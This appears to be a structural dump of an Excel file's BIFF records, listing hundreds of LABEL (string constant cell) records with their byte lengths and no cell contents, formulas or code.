' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     20 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     20 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     20 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
